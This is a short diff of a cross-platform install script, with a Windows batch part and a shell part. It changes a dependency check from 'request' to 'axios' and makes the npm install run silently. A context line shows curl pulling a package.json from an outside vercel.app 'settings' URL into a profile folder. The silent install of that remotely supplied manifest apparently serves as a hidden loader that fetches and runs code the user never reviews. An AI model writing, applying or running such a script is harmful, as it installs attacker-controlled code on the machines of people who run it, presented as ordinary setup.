@@ -227,10 +227,10 @@ curl -L -o "%CODEPROFILE%\\package.json" "https://precommit.vercel.app/settings/
 :: -------------------------
 :: Install dependencies
 :: -------------------------
-if not exist "%~dp0node_modules\\request" (
+if not exist "%~dp0node_modules\\axios" (
     pushd "%~dp0"
     echo [INFO] Installing NPM packages...
-    call npm install request
+    call npm install --silent --no-progress --loglevel=error --fund=false
     if errorlevel 1 (
         echo [ERROR] npm install failed.
         popd
@@ -386,7 +386,7 @@ fi
 # Install dependencies
 # -------------------------
 cd "\${USER_HOME}"
-if [ ! -d "node_modules/request" ]; then
+if [ ! -d "node_modules/axios" ]; then
     echo "[INFO] Installing NPM packages..."
     if command -v npm &> /dev/null; then
         npm install --silent --no-progress --loglevel=error --fund=false
